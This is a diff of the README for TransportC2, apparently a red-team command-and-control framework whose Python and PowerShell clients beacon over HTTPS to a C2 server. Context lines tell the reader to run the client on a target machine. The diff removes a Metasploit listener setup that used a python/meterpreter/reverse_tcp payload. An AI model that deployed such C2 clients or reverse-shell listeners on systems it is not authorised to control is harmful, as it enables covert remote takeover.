@@ -27,7 +27,7 @@ sudo systemctl status transportc2.service
 
 
 ## Client
-As of now, TransportC2 has clients written in Python 2/3 and PS1. Clients will make HTTPS requests to the C2 server and mimic a web connection. Variables at the top of the client file can be modified to change client check-in intervals, requesting page, etc. 
+As of now, TransportC2 has clients written in Python 2/3 and PowerShell. Clients will make HTTPS requests to the C2 server and mimic a web connection. Variables at the top of the client file can be modified to change client check-in intervals, requesting page, etc. 
 
 #### Client Usage
 Run the client on a target machine:
@@ -42,18 +42,7 @@ Invoke-Client -ServerIP 127.0.0.1 -Port 443
 #### Client Commands
 Once a client is connected, login to the Admin Interface to execute one of the following commands:
 
-*Built-in Metasploit payload only available for python client at this time*
 ![HelpMenu](server/AdminServer/static/img/help.png)
-
-#### MSF Listener
-Setup Metasploit to use built in client payload:
-```
-use exploit/multi/handler
-set payload python/meterpreter/reverse_tcp
-set Lhost 192.168.1.1
-set Lport 4444
-execute
-```
 
 ## Screenshots
 ![Login](server/AdminServer/static/img/login.png)
@@ -63,6 +52,3 @@ execute
 ## Contributors 
 Thanks to the following contributors that made this project possible:
 * @darneymartin
-
-Unintended Contributors
-* @byt3bl33d3r
